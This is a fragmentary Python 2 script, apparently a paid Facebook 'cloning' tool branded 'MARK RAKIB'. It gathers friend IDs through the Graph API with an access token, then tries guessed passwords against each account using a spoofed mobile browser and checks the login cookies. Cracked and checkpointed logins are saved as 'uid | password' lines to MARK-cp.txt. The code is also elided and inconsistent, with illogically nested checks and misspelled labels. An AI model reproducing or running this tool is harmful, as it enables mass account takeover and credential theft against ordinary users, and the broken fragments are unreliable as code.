...
'\x1b[1;91m' ༄MARK᭄•─────────────────•༄RAKIB᭄
'\x1b[1;91m'   Author      ||   MARK RAKIB
'\x1b[1;92m'   Github      ||     MARKRAKIB
'\x1b[1;93m'   FB ID       ||    MARKRAKIB
...
def main_apv():
    ...
    print logo
    try:
        key1=open("/sdcard/MARK.txt",'r').read()
    except IOError:
        os.system("clear")
        print logo
        ...
        print ("")
        print ("")
        print('\x1b[1;92m'            If You your Key 🗝️ !")
...
def main_input():
    ...
    if mx=='1':
        ...
        print ("        Member In Mark Rakib Paid Commands ")
...
def numcloning():
    ...
    print ""
    os.system('echo " ༄MARK᭄•─────────────────•༄RAKIB᭄"| lolcat')
...
def mineExt():
    ...
    print g+"[=] Extracting From MARKRAKIB : "+my_line[:15]
    ...
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From MARRAKIB : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
    ...
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From MARKRAKOB : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
...
def xokpauto():
    ...
    os.system('echo " ༄MARK᭄•─────────────────•༄RSKIB᭄"| lolcat')
    def main(arg):
        user=arg
        uid, name = user.split("|")
        name=name.lower()
...
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;92m[MRAK-OK] "+uid + " | " + pass1
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[MARK-CP] "+uid + " | " + pass3
                                    cp=open('MARK-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[MARK-CP] "+uid + " | " + pass4
                                            cp=open('MARK-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[MARK-CP] "+uid + " | " + pass5
                                                    cp=open('MARK-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
